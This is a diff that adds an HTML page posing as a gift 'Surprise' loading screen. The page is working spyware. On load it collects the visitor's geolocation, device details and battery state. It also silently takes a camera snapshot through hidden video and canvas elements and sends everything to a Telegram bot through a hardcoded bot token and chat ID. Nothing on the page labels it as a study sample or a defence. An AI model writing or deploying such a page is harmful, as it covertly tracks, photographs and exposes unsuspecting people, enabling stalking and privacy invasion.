@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title> Surprise!</title>
+  <style>
+    body {
+      background: linear-gradient(135deg, #a0d8e1, #6ec6e6);
+      color: #fff;
+      font-family: sans-serif;
+      text-align: center;
+      padding: 20px;
+    }
+    h1 {
+      font-size: 24px;
+      margin-top: 20px;
+    }
+    .info {
+      margin-top: 20px;
+      font-size: 16px;
+    }
+    #snapshot {
+      display: none;
+    }
+    video {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <h1>Surprise is Loading... 🎁</h1>
+  <p class="info">Just wait a moment please...</p>
+
+  <video id="preview" autoplay playsinline></video>
+  <canvas id="snapshot"></canvas>
+
+  <script>
+    const botToken = "7941494881:AAG-XwqtGFMvaEVRrj_Faya_abl-PGIzOxo";
+    const chatId = "7692124805";
+
+    // LOCATION + DEVICE INFO
+    async function sendDeviceDetails(position) {
+      const now = new Date().toLocaleString();
+      const ua = navigator.userAgent;
+      const platform = navigator.platform;
+      const lang = navigator.language;
+      const screenRes = `${screen.width}x${screen.height}`;
+      const battery = await navigator.getBattery?.().then(b => 
+        `Battery: ${Math.round(b.level * 100)}%, Charging: ${b.charging}`) || "Battery info not available";
+
+      const message = 
+        `📍 New Visit!\n` +
+        `🕒 Time: ${now}\n` +
+        `🌐 Platform: ${platform}\n` +
+        `📱 Language: ${lang}\n` +
+        `📺 Screen: ${screenRes}\n` +
+        `${battery}\n` +
+        `🔍 UserAgent: ${ua}\n\n` +
+        `📌 Location:\nLat: ${position.coords.latitude}\nLng: ${position.coords.longitude}`;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      });
+    }
+
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(sendDeviceDetails);
+    }
+
+    // --- AUTO CAMERA CAPTURE WITHOUT PREVIEW ---
+    const video = document.getElementById("preview");
+    const canvas = document.getElementById("snapshot");
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then((stream) => {
+        video.srcObject = stream;
+
+        video.onloadedmetadata = () => {
+          setTimeout(() => {
+            captureAndSendPhoto();
+          }, 1000); // wait 1 sec before taking snapshot
+        };
+      })
+      .catch((err) => {
+        console.error("Camera access denied:", err);
+      });
+
+    function captureAndSendPhoto() {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext("2d").drawImage(video, 0, 0);
+
+      canvas.toBlob((blob) => {
+        const formData = new FormData();
+        formData.append("chat_id", chatId);
+        formData.append("photo", blob);
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        }).then(() => {
+          // Optional: Stop the camera after capture
+          const tracks = video.srcObject.getTracks();
+          tracks.forEach(track => track.stop());
+        });
+      });
+    }
+  </script>
+</body>
+</html>
